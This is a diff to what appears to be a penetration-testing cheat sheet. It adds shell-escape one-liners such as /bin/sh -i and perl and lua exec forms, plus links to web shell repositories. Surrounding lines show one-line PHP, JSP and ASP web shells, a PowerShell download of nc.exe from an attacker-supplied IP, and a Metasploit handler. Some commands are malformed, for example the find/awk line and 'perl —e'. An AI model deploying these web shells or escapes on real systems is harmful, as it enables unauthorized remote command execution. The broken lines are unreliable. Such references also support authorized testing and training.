@@ -1246,14 +1246,16 @@ PS C:\> Invoke-WebRequest http://<IP address>/nc.exe -UserAgent $UserAgent -OutF
 - Shell Escapes
 
 ```
+$ /bin/sh -i
 $ bash -i
 $ echo os.system('/bin/bash')
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 $ script /dev/null -c bash
 $ perl —e 'exec "/bin/sh";'
+$ perl: exec "/bin/sh";
 $ ruby: exec "/bin/sh"
-$ Lua: os.execute('/bin/sh')
+$ lua: os.execute('/bin/sh')
 $ awk 'BEGIN {system("/bin/sh")}'
 $ find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 $ find . -exec /bin/sh \; -quit
@@ -1301,6 +1303,9 @@ msf> use exploit/multi/handler
 - Web Shells
 
 ```
+https://github.com/jbarcia/Web-Shells/tree/master/laudanum
+https://github.com/samratashok/nishang/tree/master/Antak-WebShell
+https://github.com/WhiteWinterWolf/wwwolf-php-webshell
 PHP: <?php system($_REQUEST["cmd"]); ?>
 JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ASP: <% eval request("cmd") %>
